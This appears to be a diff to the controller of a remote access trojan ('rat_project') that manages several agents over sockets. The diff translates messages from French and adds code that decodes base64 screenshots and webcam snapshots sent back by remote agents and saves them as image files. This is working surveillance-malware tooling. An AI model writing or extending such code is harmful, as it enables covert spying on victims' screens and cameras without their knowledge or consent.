@@ -6,9 +6,12 @@ Supporte plusieurs agents en parallèle grâce aux threads.
 Interface interactive en ligne de commande pour piloter les agents.
 """
 
+import base64
 import socket
 import threading
 import time
+from datetime import datetime
+from pathlib import Path
 from typing import Any
 
 from rat_project.common.protocol import decode_message, encode_message
@@ -323,18 +326,23 @@ def interact_with_session(session_id: int) -> None:
 
 
 def _print_response(response: dict[str, Any]) -> None:
-    """Affiche la sortie d'une réponse agent."""
+    """Display the agent's response output."""
     output = response.get("output", "")
     error = response.get("error", "")
     data = response.get("data", None)
+    command = response.get("command", "")
 
     if output:
         print(output)
     if error:
-        print(f"[!] Erreur agent : {error}")
-    if data and not output:
-        # Données binaires encodées en base64 (ex: screenshot)
-        print(f"[*] Données reçues ({len(data)} octets encodés).")
+        print(f"[!] Agent error: {error}")
+    if data and command in ("screenshot", "webcam_snapshot"):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{command}_{timestamp}.jpg"
+        Path(filename).write_bytes(base64.b64decode(data))
+        print(f"[+] Image saved: {filename}")
+    elif data and not output:
+        print(f"[*] Data received ({len(data)} encoded bytes).")
 
 
 def _shell_session(conn: socket.socket, session_id: int) -> None:
